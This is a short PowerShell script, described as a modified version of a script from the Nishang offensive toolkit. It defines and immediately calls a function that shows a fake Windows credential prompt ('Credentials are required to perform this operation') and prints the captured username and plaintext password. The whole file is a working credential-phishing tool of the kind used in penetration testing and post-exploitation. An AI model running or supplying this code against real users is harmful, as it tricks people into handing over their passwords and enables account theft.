function Auth_Popup
{
<#

.SYNOPSIS
Modified Nishang script which opens a user credential prompt.

.LINK
Original Script and credit
https://github.com/samratashok/nishang

#>

[CmdletBinding()]
Param ()

$credential = $host.ui.PromptForCredential("Credentials are required to perform this operation", "Please enter your username and password.", "", "")
$creds = $credential.GetNetworkCredential()

[String]$user = $creds.username
[String]$pass = $creds.password

write-Output $user
write-Output $pass
}

Auth_Popup
